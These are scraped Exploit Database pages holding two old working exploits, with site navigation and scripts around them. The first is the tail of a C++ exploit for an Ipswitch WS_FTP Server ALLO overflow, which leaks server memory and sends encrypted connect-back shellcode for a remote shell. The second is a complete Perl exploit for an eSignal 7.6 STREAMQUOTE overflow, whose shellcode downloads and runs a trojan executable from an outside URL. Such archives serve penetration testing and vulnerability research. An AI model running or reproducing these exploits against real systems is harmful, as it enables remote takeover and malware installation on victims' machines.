50\x72\x6F\x63\x65\x73\x73\x00";int is_valid_shlc2(char c){return c != 0;}struct tfs_data{tfs_data() : tot_size(0), line(0), ok(0) {}int line;unsigned tot_size;int ok;};int tfs_line_callback(void* data, char* line){tfs_data* m = (tfs_data*)data;if (++m->line != 1)return 1;if (strncmp(line, "250-", 4) ||(m->tot_size = atoi(line+4)) == 0)return 1;m->ok = 1;return 1;}int get_user_total_file_size(SOCKET s, unsigned& tot_size){int ret = 0;SOCKET sd = INVALID_SOCKET;__try{/** Create a $message.txt file*/if ((sd = get_data_sock(s, "$message.txt", "STOR")) < 0 ||send(sd, "%z", 2, 0) != 2)__leave;closesocket(sd);sd = INVALID_SOCKET;if (get_reply_code(s) != 226)__leave;tfs_data m;const DWORD max_wait = 10000;for (DWORD tc = GetTickCount(); GetTickCount() - tc < max_wait; ){if (send_cmd2(s, "CWD .\r\n") < 0)__leave;m.ok = m.line = 0;int code = get_reply_code(s, tfs_line_callback, &m);if (code != 500)break;}if (!m.ok)__leave;tot_size = m.tot_size;ret = 1;}__finally{if (sd >= 0)closesocket(sd);}if (!ret)msg("[-] Failed to get user total file size.\n Are you sure there's a total file size limit for this user?\n");return ret;}int delete_file(SOCKET s, const char* filename){DWORD tc = GetTickCount();const DWORD wait = 10000;while (1){if (GetTickCount() - tc > wait)return 0;if (send_cmd(s, "STAT %s\r\n", filename) != 211)return 1;if (send_cmd(s, "DELE %s\r\n", filename) < 0)return 0;}}int create_file_for_addr(SOCKET s, unsigned addr){int ret = 0;__try{if (addr >= MAX_ADDR){msg2("[-] Trying to read an addr (%08X) >= MAX_ADDR (%08X)\n", addr, MAX_ADDR);__leave;}if (!delete_file(s, temp_file))msg("[-] Could not delete file\n");unsigned tot_size;if (!get_user_total_file_size(s, tot_size))__leave;if (addr < tot_size){msg2("[-] You must delete some user files to read address %08X\n", addr);__leave;}unsigned size = addr - tot_size;if (!create_file(s, temp_file, size))__leave;ret = 1;}__finally{}return ret;}/** Returns < 0 => error* Returns = 0 => server thread crashed* Returns > 0 => read this many bytes into dst*/int xuser::read_serv_mem(unsigned addr, void* dst, int dstlen){int file_created = 0;int ret = -1;__try{if (!create_file_for_addr(s, addr))__leave;file_created = 1;if (send_cmd2(s, ALLO_STRING "\r\n") < 0)__leave;char buf[MAXLINE];int bufsz = 0;const char* m1 = "452 ";int type = 0;while (1){if (bufsz >= sizeof(buf)-1)__leave;int size = _recv(s, &buf[bufsz], sizeof(buf)-1-bufsz, 0);if (size < 0)__leave;if (size == 0){if (bufsz == 0)ret = 0;__leave;}bufsz += size;buf[bufsz] = 0;if (bufsz >= (int)strlen(m1) && memcmp(m1, buf, strlen(m1)))__leave; // Wrong reply codeconst char* s1 = " files\r\n";const char* s2 = " size\r\n";if (bufsz >= (int)strlen(s1) && !memcmp(s1, &buf[bufsz-strlen(s1)], strlen(s1))){type = 0;break;}if (bufsz >= (int)strlen(s2) && !memcmp(s2, &buf[bufsz-strlen(s2)], strlen(s2))){type = 1;break;}}const char* s = "quota exceeded; ";const char* f1 = " size; ";const char* f2 = " size\r\n";const char* f3 = " files; ";char* b = buf + strlen(m1);if (strncmp(b, s, strlen(s)))__leave;char* ss = NULL, *se = NULL;if (type == 0) // "quota exceeded; %s size; %u files\r\n"{ss = b + strlen(s);for (int i = bufsz-(int)strlen(f1); ; i--){if (i < 0)__leave;if (strncmp(f1, &buf[i], strlen(f1)))continue; // Not equal to " size; "se = &buf[i];break;}}else // "quota exceeded; %u files; %s size\r\n"{ss = strstr(buf, f3);if (!ss)__leave;ss += strlen(f3);se = &buf[bufsz-strlen(f2)];}if (!se || !ss || se < ss){msg("[-] Buggy code\n");__leave;}*se = 0;int rd_size = (int)(UINT_PTR)(se - ss) + 1; // One 00h byteret = min((int)dstlen, rd_size);memcpy(dst, ss, ret);}__finally{}if (ret < 0)msg("[-] Could not read server memory\n");else if (ret == 0){// Server thread crashedif (!init(ip, port, username, userpass))ret = -1;}return ret;}int xuser::read_serv_mem_bytes(unsigned addr, void* dst, int dstlen){for (int i = 0; i < (int)dstlen; ){int len = read_serv_mem(addr+i, (char*)dst+i, dstlen-i);if (len <= 0)return len;i += len;}return dstlen;}int xuser::read_serv_mem_string(unsigned addr, char* dst, int dstlen){int len = read_serv_mem(addr, dst, dstlen);if (len <= 0)return len;if (dst[len-1] != 0)return -1;return len;}int xuser::read_serv_mem_uint32(unsigned addr, unsigned* dst){unsigned char tmp[4];int ret = read_serv_mem_bytes(addr, tmp, sizeof(tmp));if (ret <= 0)return ret;if (ret != sizeof(tmp))return -1;*dst = (tmp[3] << 24) | (tmp[2] << 16) | (tmp[1] << 8) | tmp[0];return ret;}int xuser::exploit(unsigned long sip, unsigned short sport){int ret = 0;char* shellcode = NULL;char* badbuf = NULL;__try{/** Encrypt the shellcode*/const shellcode_len = sizeof(shlc2_code)-1;shellcode = new char[shellcode_len+1];memcpy(shellcode, shlc2_code, shellcode_len);shellcode[shellcode_len] = 0;shellcode[2] = (char)2;shellcode[3] = (char)(2 >> 8);shellcode[4] = (char)(sport >> 8);shellcode[5] = (char)sport;shellcode[6] = (char)(sip >> 24);shellcode[7] = (char)(sip >> 16);shellcode[8] = (char)(sip >> 8);shellcode[9] = (char)sip;for (int i = 0; i < 8; i++){if (!enc_byte(shellcode[2+i], shellcode[2+8+i], is_valid_shlc2))__leave;}for (int i = 0; i < 4; i++){int k = get_enc_key(&shellcode[shlc2_offs_encstart], shlc2_offs_encend-shlc2_offs_encstart, i, 4, is_valid_shlc2);if (k < 0)__leave;shellcode[shlc2_offs_enckey+i] = k;}msg("[+] Shellcode encryption key = %02X%02X%02X%02X\n",(unsigned char)shellcode[shlc2_offs_enckey+3],(unsigned char)shellcode[shlc2_offs_enckey+2],(unsigned char)shellcode[shlc2_offs_enckey+1],(unsigned char)shellcode[shlc2_offs_enckey]);for (int i = 0; i < shlc2_offs_encend-shlc2_offs_encstart; i++)shellcode[shlc2_offs_encstart+i] ^= shellcode[shlc2_offs_enckey + i % 4];/** Do some sanity checks*/if (!check_invd_bytes("shellcode", shellcode, shellcode_len, is_valid_shlc2) ||!check_invd_bytes("ret_addr", ret_addr, 4, is_valid_shlc2))__leave;if (!delete_file(s, temp_file)){msg("Could not delete file\n");__leave;}unsigned tot_size;if (!get_user_total_file_size(s, tot_size))__leave;msg("[+] Scanning server memory: ");quite_you = 1;const unsigned ADDR_START = SERV_STK_SIZE;const unsigned ADDR_END = MAX_ADDR-1;unsigned this_ptr;for (unsigned addr = ADDR_START; ; addr += SERV_STK_SIZE){if (addr > ADDR_END || !addr){/** Can happen if the address of the thread's stack is not in the same position in* memory. This most likely happens when another user logged in or it sent a FTP* command which creates a new server thread. Try again.*/msg2("[-] Could not find the this ptr. Try again.\n");__leave;}int rc = read_serv_mem_uint32(addr + SERV_STK_OFFS + SERV_STK_THIS_OFFS, &this_ptr);if (rc < 0){msg2("- unknown error\n"); // Error__leave;}else if (rc == 0){msg2("x"); // Crashed}else{msg2("."); // Bingochar tmp[0x200];if (this_ptr + SERV_THIS_USERNAME_OFFS < MAX_ADDR && this_ptr + SERV_THIS_CMDBUF_OFFS < MAX_ADDR &&read_serv_mem_string(this_ptr + SERV_THIS_USERNAME_OFFS, tmp, sizeof(tmp)) > 0 &&!strcmp(tmp, username) &&read_serv_mem_string(this_ptr + SERV_THIS_CMDBUF_OFFS, tmp, sizeof(tmp)) > 0 &&!strcmp(tmp, ALLO_STRING))break;}}quite_you = 0;msg("\n[+] this = %08X\n", this_ptr);const char* s1 = "quota exceeded; ";char padding[SERV_BUF_EIP];int padding_len = sizeof(padding) - (int)strlen(s1);memset(padding, 'A', sizeof(padding));int xpsz = (int)strlen(ALLO_STRING "\r\n") + padding_len + 4 + shellcode_len;badbuf = new char[xpsz+1];badbuf[xpsz] = 0;int tmpidx = 0;if (!add_bytes(badbuf, tmpidx, xpsz, ALLO_STRING "\r\n", (int)strlen(ALLO_STRING "\r\n")) ||!add_bytes(badbuf, tmpidx, xpsz, padding, padding_len) ||!add_bytes(badbuf, tmpidx, xpsz, ret_addr, 4) ||!add_bytes(badbuf, tmpidx, xpsz, shellcode, shellcode_len) ||tmpidx != xpsz){msg("[-] This is a bug. Now you know\n");__leave;}if (!create_file_for_addr(s, this_ptr + SERV_THIS_CMDBUF_OFFS + strlen(ALLO_STRING "\r\n")))__leave;if (send_cmd2(s, badbuf) < 0)__leave;ret = 1;}__finally{quite_you = 0;if (shellcode)delete shellcode;if (badbuf)delete badbuf;}return ret;}void show_help(char* pname){msg("%s <ip> <port> <sip> <sport> [-u username] [-p userpass] [-a]\n", pname);exit(1);}int main(int argc, char** argv){msg("Ipswitch WS_FTP Server <= 4.0.2 ALLO exploit\n");msg("(c)2004 Hugh Mann hughmann@hotmail.com\n");WSADATA wsa;if (WSAStartup(0x0202, &wsa))return 1;if (argc < 5)show_help(argv[0]);unsigned long ip = ntohl(inet_addr(argv[1]));unsigned short port = (unsigned short)atoi(argv[2]);unsigned long sip = ntohl(inet_addr(argv[3]));unsigned short sport = (unsigned short)atoi(argv[4]);const char* username = "anonymous";const char* userpass = "Hugh Mann";for (int i = 5; i < argc; i++){if (!strcmp(argv[i], "-u") && i + 1 < argc){username = argv[++i];}else if (!strcmp(argv[i], "-p") && i + 1 < argc){userpass = argv[++i];}else if (!strcmp(argv[i], "-a")){output_all = 1;}elseshow_help(argv[0]);}if (!ip || !port || !sip || !sport)show_help(argv[0]);xuser user;if (!user.init(ip, port, username, userpass))return 0;if (!user.exploit(sip, sport))msg("[-] u n33d t0 s7uddy m0r3...\n");elsemsg("[+] Wait a few secs for a shell\n");return 0;}// milw0rm.com [2004-03-23]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 166
eSignal 7.6 - STREAMQUOTE Remote Buffer Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDeSignal 7.6 - STREAMQUOTE Remote Buffer OverflowEDB-ID:166CVE:2004-1868EDB Verified:Author:VizibleSoftType:remoteExploit:/Platform:WindowsDate:2004-03-26Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl## eSignal v7.6 remote exploit (c) VizibleSoft =*= http://viziblesoft.com/insect## 25-mAR-2004#use IO::Socket;sub usage{die("\nUsage: perl $0 host port\n");}print "\r\neSignal v7.6 remote exploit, (c) VizibleSoft.com\r\n";my $ip      = $ARGV[0] || usage();my $port    = $ARGV[1] || usage();my $data    = "";my $ret     = "\xf3\x7b\x20\x7c";	# MFC71.dll "jmp esp"my $nop     = "\x90";## Used api..#$api  = "\x00wininet.dll\x00InternetOpenA\x00"."InternetOpenUrlA\x00InternetReadFile\x00kernel32.dll\x00"."_lcreat\x00_lwrite\x00_lclose\x00";## Url of file to execute#$url = "http://viziblesoft.com/insect/sploits/troy.exe";### Filename for our file on remote system$fname = "setup.exe";### Shellcode: downloads and executes file at URL#$shellc = "\x90"."\x8B\xEC\x03\xEA\xB8\xEA\xFE\xFF\xFF\xF7\xD0\x03\xE8\x83\xC5\x0B\x8B\xFD\x4F\xF7"."\x17\x83\xC7\x04\x83\x3F\xFF\x7C\xF6\xF7\x17\xB8\x5C\x12\x14\x7C\x8B\x18\x55\xFF"."\xD3\x8B\xF8\x33\xC9\xB1\x03\x8D\x55\x0C\xB8\x58\x12\x14\x7C\x8B\x18\x51\x52\x52"."\x57\xFF\xD3\x5A\x59\x89\x02\x83\xC2\x03\x42\x8A\x02\x3A\xC5\x7F\xF9\x42\xFE\xC9"."\x3A\xCD\x7F\xDE\xB8\x5C\x12\x14\x7C\x8B\x18\x8D\x55\x3C\x52\xFF\xD3\x8B\xF8\xB8"."\x58\x12\x14\x7C\x8B\x18\x53\x8D\x55\x49\x52\x52\x57\xFF\xD3\x5A\x89\x02\x8B\x1C"."\x24\x8D\x55\x51\x52\x52\x57\xFF\xD3\x5A\x89\x02\x5B\x8D\x55\x59\x52\x52\x57\xFF"."\xD3\x5A\x89\x02\x33\xD2\x52\x52\x52\x52\x55\xFF\x55\x0C\x33\xD2\x52\xB6\x80\xC1"."\xE2\x10\x52\x33\xD2\x52\x52\x8D\x4D\x60\x41\x51\x50\xFF\x55\x1A\x89\x45\x1A\x33"."\xD2\x52\x8D\x55\xF6\x52\xFF\x55\x49\x89\x45\x49\x33\xD2\xB6\x02\x2B\xE2\x83\xEC"."\x04\x33\xD2\xB6\x02\x54\x8B\xC4\x83\xC0\x08\x52\x50\x8B\x45\x1A\x50\xFF\x55\x2B"."\x8B\x04\x24\x8D\x54\x24\x04\x50\x52\x8B\x45\x49\x50\xFF\x55\x51\x83\x3C\x24\x01"."\x7D\xD7\x8B\x45\x49\x50\xFF\x55\x59\x8D\x55\xF6\x52\xB8\x3F\x0E\x81\xF8\x35\x80"."\x80\x80\x80\xFF\xD0\xB8\xD3\xFC\x80\xF8\x35\x80\x80\x80\x80\xFF\xE0$fname";$movsb = "\x90\x33\xc9\xb5\x02\xb1\xcc\x8b\xf4\x2b\xf1\x8b\xfc\x33\xd2\xb2\x15\x03\xfa\xf3\xa4";## xor data block#$url = $api . $url;for(my $i=0; $i<length($url); $i++) {$data = $data . (substr($url, $i, 1) ^ "\xff");};$data .= "\xff\xff\xfe\xfe\xff\xff\xff\xff";## construct overflow string...#$shellc .= $data;$shellc .= ("\xcc" x (712 - length($shellc)));$shellcode = $nop x (8 * 16) .$shellc .$ret .$movsb .$nop x (191-16);# print "shellcode len: " . length($shellcode) . "\r\n";$data = '<STREAMQUOTE>' . $shellcode . 	'</STREAMQUOTE>';# print "sending data of len: " . length($data) . "\n";print sendraw($data);print "[+] Overflow sent / file executed!\n";exit;sub sendraw {my ($pstr)=@_;my $target;$target= inet_aton($ip) || die("[-] inet_aton problems");socket(S,2,1,getprotobyname('tcp')||0) || die("[-] Socket problems\n");if(connect(S,pack "SnA4x8",2,$port,$target)){select(S);              $|=1;print $pstr;            my @in=<S>;select(STDOUT);         close(S);return @in;} else { die("[-] Can't connect...\n"); }}# milw0rm.com [2004-03-26]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort142122232542495366697079808110210511011111311912313513914316116216438338940240641144344444544650250451351451553254855455561762363165568978378780887388890199810001040108910991100111411201194123514711521153315811589160416171723174317611812185818611900194720002022204921002103212121252181224223152375238023812401248025252640281028122947295429903000303030503052312831293181320032173306333333783389346034653500353536323690379038143817400040024070408141054111432243434434450145554592466147504848500050605061508050815093515151805247525052725308543254665554555556005655566658005803581458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 167
